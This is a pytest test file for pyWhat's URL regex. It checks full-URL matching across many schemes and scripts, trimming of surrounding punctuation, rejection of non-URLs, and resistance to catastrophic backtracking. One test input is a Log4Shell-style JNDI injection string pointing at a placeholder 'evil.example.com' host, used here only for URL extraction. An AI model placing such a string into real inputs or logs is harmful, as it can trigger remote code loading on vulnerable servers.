"""
Test cases for URL identification.

The URL regex has to match the whole URL and nothing around it, in boundaryless
mode (the default of the CLI) too (issues #117 and #252).
"""
import re
import time

import pytest
from click.testing import CliRunner

from pywhat import identifier
from pywhat.filter import Filter
from pywhat.helper import load_regexes
from pywhat.what import main

URL = "Uniform Resource Locator (URL)"
r = identifier.Identifier(boundaryless=Filter())


def _urls(text):
    out = r.identify(text)
    if out["Regexes"] is None:
        return []
    return [
        match["Matched"]
        for match in out["Regexes"]["text"]
        if match["Regex Pattern"]["Name"] == URL
    ]


@pytest.mark.parametrize(
    "url",
    [
        "google.com/help",
        "https://www.google.com",
        "https://google.co.uk/search?q=a",
        "https://github.com/bee-san/pyWhat/issues/117#issuecomment-881348890",
        # port with one digit
        "https://example.com:8/x",
        # user without a password, and characters like "-" and "_" in it
        "https://user@bitbucket.org/team/repo.git",
        "https://deploy-bot:s3cr3t_t0ken@github.com/org/repo.git",
        # user and password with an IP address
        "https://user:pass@10.0.0.1:8080/admin",
        # domains starting with an IP address
        "http://10.1.1.1.nip.io/",
        # punycode subdomain
        "https://xn--d1acufc.xn--80aaxitdbjk.xn--p1ai/",
        # brackets and braces in the path and query
        "https://example.com/?a[]=1&a[]=2",
        "https://example.com/?filter[name]=x&page[size]=10",
        "https://api.github.com/repos/{owner}/{repo}",
        "https://example.com/api/${id}",
        "https://en.wikipedia.org/wiki/Swiss_cheese_(North_America)#Production",
        "https://en.wikipedia.org/wiki/Ender's_Game",
        # non-ASCII characters in the path
        "https://de.wikipedia.org/wiki/K\u00f6ln",
        "https://ja.wikipedia.org/wiki/\u6771\u4eac\u90fd",
        "https://www.google.com/maps/@51.5,-0.12,15z",
        "https://example.com/#!/route",
        "http://d.com/#@.s?h/",
        "https://example.com/?token=abc==",
        # combining vowel signs (they are not \w), en dashes, middle dots,
        # symbols and emoji in the path
        "https://hi.wikipedia.org/wiki/\u092d\u093e\u0930\u0924",
        "https://ta.wikipedia.org/wiki/\u0ba4\u0bae\u0bbf\u0bb4\u0bcd",
        "https://th.wikipedia.org/wiki/\u0e01\u0e23\u0e38\u0e07\u0e40\u0e17\u0e1e",
        "https://en.wikipedia.org/wiki/Mexican\u2013American_War",
        "https://ca.wikipedia.org/wiki/Paral\u00b7lel",
        "https://ja.wikipedia.org/wiki/\u30cb\u30e5\u30fc\u30e8\u30fc\u30af\u30fb\u30bf\u30a4\u30e0\u30ba",
        "https://fa.wikipedia.org/wiki/\u0645\u06cc\u200c\u062e\u0648\u0627\u0647\u0645",
        "https://example.com/\u2764\ufe0f",
        "https://emojipedia.org/\U0001f600/",
        "https://example.com/price?amount=5\u20ac",
        "https://finance.yahoo.com/quote/^GSPC",
        # nested parentheses
        "https://en.wikipedia.org/wiki/Foo_(bar_(baz))",
        "http://foo.com/unicode_(\u272a)_in_parens",
        # internationalized domain names that are not in punycode
        "https://m\u00fcller.de/",
        "https://b\u00fccher.example.com/katalog",
        "http://\u043f\u0430\u043f\u0438\u0440\u043e\u0441\u043a\u0430.\u0440\u0444",
        "https://\u4f8b\u3048.jp/",
        "https://\u0645\u062b\u0627\u0644.\u0645\u0635\u0631/",
        "http://\u263a.damowmow.com/",
        "http://\u2318.ws",
        # all characters that are allowed in the user name and password, and
        # an "@" in the password, which browsers accept
        "http://-.~_!$&'()*+,;=:%40:80%2f::::::@example.com",
        "https://user:p@ss@example.com/",
        # IPv6 addresses and localhost
        "http://[::1]/",
        "http://[::1]:8080/path",
        "https://[2001:db8:85a3:8d3:1319:8a2e:370:7348]:443/",
        "http://[fe80::1%25eth0]/",
        "http://[::ffff:192.0.2.128]/",
        "http://localhost",
        "http://localhost:8000/admin",
        "https://localhost:3000/api/v1?x=1",
        # other schemes
        "ws://example.com/socket",
        "wss://stream.binance.com:9443/ws/btcusdt@trade",
        "ftps://ftp.example.com/pub/",
        "sftp://user@example.com/path",
        "ssh://git@github.com:22/org/repo.git",
        "git://git.kernel.org/pub/scm/git/git.git",
        "git+ssh://git@github.com/org/repo.git",
        "svn+ssh://svn.example.com/repo/trunk",
        "rtsp://admin:admin@192.168.1.64:554/stream1",
        "rtmp://live.example.com/app/stream",
        "ldap://ldap.example.com/dc=example,dc=com",
        "smb://fileserver.example.com/share",
        "ircs://irc.libera.chat:6697/#pytest",
        "mongodb+srv://user:pass@cluster0.example.net/db?retryWrites=true",
        "postgresql://user:secret@db.example.com:5432/app",
        "mysql://root@127.0.0.1:3306/test",
        "rediss://default:pass@cache.example.com:6380/0",
        "amqps://user:pass@broker.example.com/vhost",
    ],
)
def test_url_is_fully_matched(url):
    assert _urls(f"Visit {url} today") == [url]


def test_url_with_longest_tld_is_matched():
    assert _urls("google.co google.com google.coffee") == [
        "google.co",
        "google.com",
        "google.coffee",
    ]


@pytest.mark.parametrize(
    "text, urls",
    [
        ("Go to https://example.com/path.", ["https://example.com/path"]),
        ("Go to https://example.com.", ["https://example.com"]),
        ("Is it https://example.com/?q=1?", ["https://example.com/?q=1"]),
        ("Did you see https://example.com/?", ["https://example.com/"]),
        (
            "Visit https://www.google.com:443/search?q=hello!",
            ["https://www.google.com:443/search?q=hello"],
        ),
        ("URL: https://example.com/a/b/c/: done", ["https://example.com/a/b/c/"]),
        ("https://example.com/a...", ["https://example.com/a"]),
        ("url=https://example.com/a;", ["https://example.com/a"]),
        ("(see https://example.com/path)", ["https://example.com/path"]),
        ("[link](https://example.com/a)", ["https://example.com/a"]),
        (
            "[x](https://en.wikipedia.org/wiki/Swiss_cheese_(North_America))",
            ["https://en.wikipedia.org/wiki/Swiss_cheese_(North_America)"],
        ),
        ("[url=https://example.com/a]x[/url]", ["https://example.com/a"]),
        ("background: url(https://example.com/a.png);", ["https://example.com/a.png"]),
        ("<https://example.com/a>", ["https://example.com/a"]),
        ('<a href="https://example.com?q=1">x</a>', ["https://example.com?q=1"]),
        ('{"url":"https://example.com/a","b":1}', ["https://example.com/a"]),
        ("requests.get('https://example.com/a')", ["https://example.com/a"]),
        ("fetch(`https://example.com/api/${id}`)", ["https://example.com/api/${id}"]),
        ("\u201chttps://example.com/a\u201d", ["https://example.com/a"]),
        (
            "'https://example.com/a', 'https://example.org/b'",
            ["https://example.com/a", "https://example.org/b"],
        ),
        (
            "https://example.com/a, https://example.org/b",
            ["https://example.com/a", "https://example.org/b"],
        ),
        # quotes and punctuation of other languages
        ("\u00abhttps://example.com/a\u00bb", ["https://example.com/a"]),
        ("\u201ehttps://example.com/a\u201c", ["https://example.com/a"]),
        ("Siehe https://example.com/a\u2026", ["https://example.com/a"]),
        ("https://example.com/a\u2014see above", ["https://example.com/a"]),
        (
            "\u0632\u0648\u0631\u0648\u0627 https://example.com/ar\u060c \u062b\u0645",
            ["https://example.com/ar"],
        ),
        (
            "\u0926\u0947\u0916\u0947\u0902 https://hi.wikipedia.org/wiki/\u092d\u093e\u0930\u0924\u0964",
            ["https://hi.wikipedia.org/wiki/\u092d\u093e\u0930\u0924"],
        ),
        # Chinese and Japanese text has no spaces around URLs
        ("\u8bf7\u8bbf\u95eehttps://example.com\u3002", ["https://example.com"]),
        ("\u8bf7\u8bbf\u95eeexample.com\u83b7\u53d6", ["example.com"]),
        (
            "\u8a73\u3057\u304f\u306f\u300chttps://example.com/a\u300d",
            ["https://example.com/a"],
        ),
        (
            "\u8bbf\u95ee\uff08https://example.com/a\uff09\u3002",
            ["https://example.com/a"],
        ),
        ("\u8bbf\u95ee\u3010https://example.com/a\u3011", ["https://example.com/a"]),
        # invisible characters: zero width space, right-to-left marks
        ("https://example.com/a\u200b next", ["https://example.com/a"]),
        ("\u200fhttps://example.com/a\u200f", ["https://example.com/a"]),
        (
            "|https://example.com/a|https://example.org/b|",
            ["https://example.com/a", "https://example.org/b"],
        ),
        ("`https://example.com/a`", ["https://example.com/a"]),
        ("Open http://localhost.", ["http://localhost"]),
        ("Is http://[::1]:8080/ up?", ["http://[::1]:8080/"]),
        # a scheme glued to other text, like in the strings of a binary file
        ("Phttp://evil.example.com/x", ["http://evil.example.com/x"]),
        ("${jndi:ldap://evil.example.com:1389/a}", ["ldap://evil.example.com:1389/a"]),
        # hosts without a scheme in other alphabets
        (
            "Siehe m\u00fcller.de und b\u00fccher.example.com.",
            ["m\u00fcller.de", "b\u00fccher.example.com"],
        ),
        (
            "\u043f\u0430\u043f\u0438\u0440\u043e\u0441\u043a\u0430.\u0440\u0444",
            ["\u043f\u0430\u043f\u0438\u0440\u043e\u0441\u043a\u0430.\u0440\u0444"],
        ),
    ],
)
def test_url_does_not_include_surrounding_punctuation(text, urls):
    assert _urls(text) == urls


@pytest.mark.parametrize(
    "text",
    [
        "tryhackme.comm",
        "https://example.comfoo",
        "x = self.items[0]",
        "df.to_csv(path)",
        "response.status_code",
        "org.apache.commons.lang3.builder.ToStringBuilder.reflectionToString",
        # a TLD followed by another label is not the end of the host
        "www.google.com.invalid",
        "com.google.android.gms",
        "libglib-2.0.so.0",
        # "рус" is a TLD, "русский" is a word
        "\u044f\u0437\u044b\u043a.\u0440\u0443\u0441\u0441\u043a\u0438\u0439",
        # no part of an IP address or of a host name
        "http://1.1.1.1.1",
        "http://10.0.0.256/",
        "http://1.2.3.4abc",
        "http://[::1",
        "http://[1:2:3:4:5:6:7:8:9]/",
        "http://[:::1]/",
        "http://localhostx/",
        "http://localhost.localdomain/",
        "localhost:8000",
    ],
)
def test_url_is_not_matched_in_the_middle_of_a_word(text):
    assert _urls(text) == []


def test_cli_prints_the_full_url():
    runner = CliRunner()
    result = runner.invoke(
        main, ["--include", "URL", "Visit https://www.google.com/search?q=hello."]
    )
    assert result.exit_code == 0
    assert "Matched on: https://www.google.com/search?q=hello\n" in result.output


@pytest.mark.parametrize(
    "text",
    [
        pytest.param("a" * 50000, id="long word"),
        pytest.param("0x" + "6080604052" * 5000, id="long hex string"),
        pytest.param("http://" + "a" * 50000, id="scheme and long word"),
        pytest.param("a." * 2000, id="long dotted name"),
        pytest.param("xn--" * 12500, id="repeated punycode prefix"),
        pytest.param("https://example.com/a" + "." * 50000, id="trailing dots"),
        pytest.param("https://example.com/(" + "a" * 50000, id="unclosed bracket"),
        pytest.param("https://example.com/" + "((a" * 20000, id="nested brackets"),
        pytest.param("https://" + "a@" * 25000, id="many at signs"),
        pytest.param("https://" + "a.a@" * 10000, id="dotted user names"),
        pytest.param("https://[" + "1:" * 20000, id="long IPv6 address"),
        pytest.param("\u4e2d" * 50000, id="long Chinese text"),
        pytest.param("m\u00fcller." * 5000, id="long dotted non-ASCII name"),
        pytest.param("https://" + "\u4e2d" * 50000, id="scheme and long Chinese text"),
    ],
)
def test_url_regex_does_not_backtrack_catastrophically(text):
    entry = next(regex for regex in load_regexes() if regex["Name"] == URL)
    start = time.perf_counter()
    list(re.finditer(entry["Boundaryless Regex"], text))
    assert time.perf_counter() - start < 2
